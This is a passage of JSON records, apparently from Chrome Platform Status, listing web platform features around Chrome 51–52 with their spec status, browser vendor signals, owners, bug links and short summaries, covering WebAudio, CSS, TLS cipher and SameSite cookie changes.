          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "All AudioParams have a readonly min and max attribute to specify the minimum and maximum value the AudioParam can have.  The value is clamped to lie in this range.  This allows easy introspection for the developer to determine the valid ranges for a parameter.",
    "id": 5693824068222976,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#attributes-5",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioParam"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:05.350880",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Add Automation Support to PannerNode and AudioListener",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "ios": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "http://crbug.com/590000",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Automation methods for the position and orientation coordinates of PannerNode and the position, up, and forward vectors of the AudioListener are added.  This allows smooth changes in the coordinates via AudioParam methods.\r\n\r\nThis effectively undeprecates the PannerNode and AudioListener.  The old methods such as setPosition, setOrientation, etc., are retained, but deprecated because they have obvious equivalents with just setting the individual coordinate values.",
    "id": 5767190162702336,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#the-pannernode-interface",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioListener",
        "https://developer.mozilla.org/en-US/docs/Web/API/PannerNode"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:35.738710",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: DynamicsCompressor.reduction is a float not AudioParam",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "ios": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/595022",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chrome implements the reduction attribute for a DynamicsCompressorNode as an AudioParam.  The WebAudio spec says it should be a readonly float.\r\n\r\nChange Chrome to implement the specification.",
    "id": 5086921298542592,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#widl-DynamicsCompressorNode-reduction",
        "https://developer.mozilla.org/en-US/docs/Web/API/DynamicsCompressorNode",
        "https://developer.mozilla.org/en-US/docs/Web/API/DynamicsCompressorNode/reduction"
      ],
      "samples": [
        "https://github.com/GoogleChrome/web-audio-samples/wiki/DynamicsCompressor.reduction"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:55.634180",
      "by": "ericbidelman@google.com"
    },
    "name": "WebRTC: Storing RTCCertificate in IndexedDB",
    "tags": [
      "WebRTC",
      "RTCCertificate",
      "IndexedDB",
      "RTCPeerConnection"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/webrtc-pc/#rtccertificate-interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1172785",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "hbos@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/581354",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "RTCCertificates are self-signed certificates used in the DTLS handshake for when setting up a connection with an RTCPeerConnection. This feature allows RTCCertificates to be persisted to storage by an application by implementing the structured clone algorithm. This means RTCCertificates can be saved and loaded from an IndexedDB database, saving the cost of generating new certificates for new sessions.",
    "id": 5701657081937920,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/06/webrtc-ecdsa"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-08-11 16:45:38.176230",
      "by": "ericbidelman@google.com"
    },
    "name": "addEventListener AddEventListenerOptions API",
    "tags": [
      "EventListenerOptions",
      "addEventListener",
      "passive"
    ],
    "comments": "The dictionary itself is not observable to JavaScript. The main change is the semantics of remove.\r\n\r\nIn M51;\r\n\r\naddEventListener('touchstart', func, {passive: true});\r\naddEventListener('touchstart', func, {passive: false});\r\n\r\nwould end up adding two listeners. But since passive is no longer part of the key; in M52; the second add will be a no-op.\r\n\r\nThe key is made up of only 3 args; eventtype, listener function, capture.\r\n\r\n",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-eventtarget-addeventlistener",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/49",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/602735",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "url": "https://github.com/WICG/EventListenerOptions/issues/27",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "EventListenerOptions API was added in https://www.chromestatus.com/features/5718574840676352\r\n\r\nThe spec was revised to add\r\nAddEventListenerOptions which is a dictionary only for addEventListener(...) so that fields could be added that did not make up the matching key.\r\n\r\nThis change is to move the add the AddEventListenerOptions dictionary definition, change the API and move the 'passive' field from EventListenerOptions to AddEventListenerOptions\r\n",
    "id": 6540125429301248,
    "resources": {
      "docs": [
        "https://github.com/WICG/EventListenerOptions/issues/27",
        "Relevant spec changes: https://github.com/whatwg/dom/commit/e002d7811533e276c9927b237748c4e170f4cb10",
        "https://github.com/whatwg/dom/commit/a13a3c7fc14732691b50c51316b16de0915a61f2"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:05.074360",
      "by": "ericbidelman@google.com"
    },
    "name": "font-variant-caps",
    "tags": [
      "css",
      "font-variant-caps",
      "font-variant",
      "typography",
      "opentype"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-fonts/#font-variant-caps-prop",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en/docs/Web/CSS/font-variant-caps#Browser_Compatibility",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "drott@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/587094",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/5735/css-font-features/",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Space separated CSS value keywords for activating OpenType features related to small-caps, all-small-caps, etc.\r\n\r\nUsing the CSS keywords for feature selection is at candidate recommendation status in the CSS Fonts Module level 3 and is the spec recommended way to activate common features. \r\n\r\nSignals from content developers and font foundries indicate that the CSS font-variant-* value keywords are easier to work with and less cryptic than font-feature settings. ",
    "id": 5764191470223360,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en/docs/Web/CSS/font-variant-caps"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:58.181030",
      "by": "ericbidelman@google.com"
    },
    "name": "font-variant-numeric",
    "tags": [
      "css",
      "font-variant-numeric",
      "font-variant",
      "typography",
      "opentype"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-fonts/#font-variant-numeric-prop",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en/docs/Web/CSS/font-variant-caps#Browser_Compatibility",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "drott@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/609813",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/5735/css-font-features/",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Space separated CSS value keywords for activating OpenType features related to numeric forms. \r\nUsing the CSS keywords for feature selection is at candidate recommendation status in the CSS Fonts Module level 3 and is the spec recommended way to activate common features. Signals from content developers and font foundries indicate that the CSS font-variant-* value keywords are easier to work with and less cryptic than font-feature settings.",
    "id": 5716551491649536,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en/docs/Web/CSS/font-variant-numeric"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-06-26 16:08:44.831975",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "'SameSite' cookie attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/draft-west-first-party-cookies",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=795346#c58",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://crbug.com/459154",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Same-site cookies (née \"First-Party-Only\" (née \"First-Party\")) allow servers to mitigate the risk of CSRF and information leakage attacks by asserting that a particular cookie should only be sent with requests initiated from the same registrable domain.",
    "id": 4672634709082112,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:48.612130",
      "by": "ericbidelman@google.com"
    },
    "name": "AES_256_GCM for TLS.",
    "tags": [
      "tls",
      "ssl",
      "aesgcm"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/rfc5246",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "davidben@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://crbug.com/591516",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "url": "https://www.ssllabs.com/ssltest/viewClient.html?name=Edge&version=13&platform=Win%2010",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://www.ssllabs.com/ssltest/viewClient.html?name=Safari&version=9&platform=OS%20X%2010.11",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Historically, TLS used AES ciphers based on a flawed CBC-mode-based construction. These ciphers are fragile and very difficult to implement securely. TLS 1.2 added better ciphers based on AES-GCM. We current support AES_128_GCM, but many servers order by key size above all else, placing the legacy AES_256_CBC above our preferred AES_128_GCM. To simplify server configuration and negotiate modern ciphers with more existing servers, we'll be adding AES_256_GCM as well.",
    "id": 5659196699705344,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:30.671840",
      "by": "ericbidelman@google.com"
    },
    "name": "Array subclassing and Symbol.species support",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tc39.github.io/ecma262/#sec-arrayspeciescreate",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1131043",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "littledan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4093",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "url": "https://kangax.github.io/compat-table/es6/#edge13",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=153660",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "ES2015 changes the semantics of Arrays and certain other classes to create subclass instances from certain methods, and allow a new interception point, Symbol.species, to control whether it's actually the subclass or another class which is instantiated. For example, Array.prototype.map constructs instances of the subclass as its output, with the option to customize this by changing Symbol.species",
    "id": 4750327530127360,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/species"
      ]
    }
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-06-14 18:28:33.781420",
      "by": "ericbidelman@google.com"
    },
    "name": "Asynchronous Blob Construction",
    "tags": [
      "blob",
      "blobs"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "dmurph@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=375297",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Large blobs previously blocked the renderer while transferring data to the browser. This is now asynchronous, which speeds up blob construction. This is the first part of the plan to allow blob data to be saved on disk, which removes the 500MB limit on blob storage.",
    "id": 4956772716511232,
    "resources": {
      "docs": [
        "https://bit.ly/BlobStorageRefactor",
        "https://bit.ly/BlobStorageRefactorPreso"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:42.262670",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS border-image: respect border style",
    "tags": [
      "border-image",
      "css-backgrounds"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://www.w3.org/TR/2005/WD-css3-background-20050216/#the-border-image",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/compat/issues/17",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "cavalcantii@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=559258",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=99922",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Blink will begin to require a border style in order to paint border images. This has always been required by the spec, but has not been enforced. In order to not be affected by this change, add e.g. 'border-style:solid' where border-image is used.",
    "id": 5542503914668032,
    "resources": {
      "docs": [
        "https://lists.w3.org/Archives/Public/www-style/2015Dec/0080.html"
      ],
      "samples": [
        "http://codepen.io/Savago/pen/yYrgyK"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:23:18.983260",
      "by": "ericbidelman@google.com"
    },
    "name": "Clients.get(id)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/ServiceWorker/#clients-get",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1222464",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 51
        },
        "owners": [
          "jungkee.song@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 51,
        "flag": true,
        "android": 51,
        "bug": "https://crbug.com/552310",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A method that gets a service worker's Client object matching a given id and returns a promise that resolves with it.",
    "id": 5637562412564480,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Clients/get"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:50.756930",
      "by": "ericbidelman@google.com"
    },
    "name": "Correct handling of percentages in children of flex items",
    "tags": [
      "flexbox"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-flexbox/#definite-sizes",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "cbiesinger@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "http://crbug.com/341310",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Certain flex items should be considered to have definite sizes (see spec URL), and therefore if a child element of a flex item uses percentage sizes, they should work.",
    "id": 5670760496496640,
    "resources": {
      "docs": [
        "http://crbug.com/542388",
        "http://crbug.com/346275"
      ],
      "samples": [
        "http://jsbin.com/zefuxiviso/2/edit?html,output"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-01-10 20:31:00.760950",
      "by": "jmedley@google.com"
    },
    "name": "Credential Management API",
    "tags": [
      "password",
      "credential",
      "passwords",
      "credentials"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://w3c.github.io/webappsec-credential-management/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink>SecurityFeature>CredentialManagement"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=576705",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2017-January/028684.html",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The API provides a programmatic interface to the browser's credential manager. In short, an origin can request a user's credentials to sign them in, or can ask the browser to save credentials on the user's behalf. Both of these requests are user-mediated.",
    "id": 5026422640869376,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Credential_Management_API",
        "https://developer.mozilla.org/en-US/docs/Web/API/Credential",
        "https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer",
        "https://developer.mozilla.org/en-US/docs/Web/API/FederatedCredential",
        "https://developer.mozilla.org/en-US/docs/Web/API/PasswordCredential"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:39.535800",
      "by": "ericbidelman@google.com"
    },
    "name": "Custom messages in onbeforeunload dialogs",
    "comments": "This shipped in Safari 9.1, and has been shipping in Firefox since Firefox 4.\r\n\r\nSafari considers this a security fix and assigned it CVE-2009-2197 (see https://support.apple.com/en-us/HT206171 ).\r\n\r\nApproved with the intent https://groups.google.com/a/chromium.org/d/msg/blink-dev/YIH8CoYVGSg/Di7TsljXDQAJ .",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/browsers.html#unloading-documents",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/WindowEventHandlers/onbeforeunload",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 51
        },
        "owners": [
          "avi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "http://crbug.com/587940",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/prerelease/mac/releasenotes/General/WhatsNewInSafari/Articles/Safari_9_1.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Negative",
          "val": 5
        }
      }
    },
    "summary": "A window’s onbeforeunload property may be set to a function that returns a string. If the function returns a string, then before unloading the page, a dialog is shown to have the user confirm that they indeed want to navigate away.\r\n\r\nThe string provided by the function will no longer be shown in the dialog. Rather, a generic string not under the control of the webpage will be shown.",
    "id": 5349061406228480,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:03.248950",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate DHE-based ciphers",
    "tags": [
      "tls",
      "ssl",
      "dhe"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/rfc5246",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 51
        },
        "owners": [
          "davidben@chromium",
          "awhalley@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "bug": "https://crbug.com/598109",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://www.ssllabs.com/ssltest/viewClient.html?name=Safari&version=9&platform=OS%20X%2010.11",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Last year, we raised the minimum TLS Diffie-Hellman group size from 512-bit to 1024-bit. As mentioned then, 1024-bit is insufficient for the long-term. However, metrics report that around 95% of DHE connections seen by Chrome use 1024-bit DHE. This, compounded with how DHE is negotiated in TLS, makes it difficult to move past 1024-bit. Servers should upgrade to ECDHE if available. Otherwise, ensure a plain-RSA cipher suite is enabled.",
    "id": 5752033759985664,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:56.988600",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and remove SPDY/3.1",
    "tags": [
      "spdy",
      "http2"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.chromium.org/spdy/spdy-protocol/spdy-protocol-draft3-1",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 51
        },
        "owners": [
          "bnc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "bug": "https://crbug.com/587469",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
